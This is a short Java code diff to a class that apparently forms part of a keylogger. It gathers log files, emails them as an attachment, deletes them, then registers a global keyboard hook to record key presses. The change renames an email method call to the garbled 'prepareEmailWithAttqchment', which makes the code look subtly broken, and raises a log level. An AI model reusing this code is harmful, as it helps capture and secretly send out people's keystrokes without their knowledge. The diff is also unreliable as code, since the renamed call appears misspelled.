@@ -33,11 +33,11 @@ public final class LogicFlow {
     public void execute() throws NativeHookException {
         files = logFilesCollector.collectLogs();
         try {
-            mailSender.prepareEmailWithAtatchment(files);
+            mailSender.prepareEmailWithAttqchment(files);
             mailSender.send();
             logFilesCollector.removeLogs(files);
         } catch (EmailException e) {
-            LOG.info("Mail has not been sent due to: " + e.getMessage());
+            LOG.warning("Mail has not been sent due to: " + e.getMessage());
         }
         GlobalScreen.registerNativeHook();
         writerTask = new WriterTask(keyReader, new LogRecorder());
